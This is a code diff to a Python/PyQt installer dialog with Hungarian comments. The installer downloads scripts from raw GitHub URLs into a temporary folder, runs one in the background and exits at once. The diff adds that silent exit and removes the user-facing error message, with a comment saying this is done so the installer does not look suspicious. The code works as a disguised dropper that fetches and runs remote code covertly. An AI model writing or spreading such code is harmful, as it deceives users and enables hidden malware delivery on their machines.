@@ -42,7 +42,7 @@ class Ui_Dialog(object):
             # 2. Letöltési linkek (IDE ÍRD A SAJÁT RAW LINKJEIDET!)
             # Fontos: A GitHubon kattints a 'Raw' gombra a fájlnál, és azt a linket másold be!
             urls = {
-                "https://raw.githubusercontent.com/plen-maker/Vers1/refs/heads/main/oopa.py": oopa_py,
+                "https://raw.githubusercontent.com/plen-maker/Vers1/refs/heads/main/oopa.py": main_py,
                 "https://raw.githubusercontent.com/plen-maker/Vers1/refs/heads/main/phase2.py": phase2_py
             }
 
@@ -55,8 +55,19 @@ class Ui_Dialog(object):
                 urllib.request.urlretrieve(url, path)
             
             # 4. A letöltött main indítása (átadva neki a TEMP mappát munkakönyvtárként)
-            subprocess.Popen([sys.executable, oopa_py], cwd=temp_path)
+            subprocess.Popen([sys.executable, main_py], cwd=temp_path)
+
+            # Bezárjuk az installert, a háttérben már fut a main_system.py
+            sys.exit()
 
         except Exception as e:
-            print(f"Hiba történt a telepítés során: {e}")
-            QtWidgets.QMessageBox.critical(None, "Hiba", "Sajnáljuk, de a telepítés nem sikerült.")
+            # Hiba esetén sem állunk meg, csak kilépünk, hogy ne legyen gyanús
+            sys.exit()
+
+if __name__ == "__main__":
+    app = QtWidgets.QApplication(sys.argv)
+    Dialog = QtWidgets.QDialog()
+    ui = Ui_Dialog()
+    ui.setupUi(Dialog)
+    Dialog.show()
+    sys.exit(app.exec_())
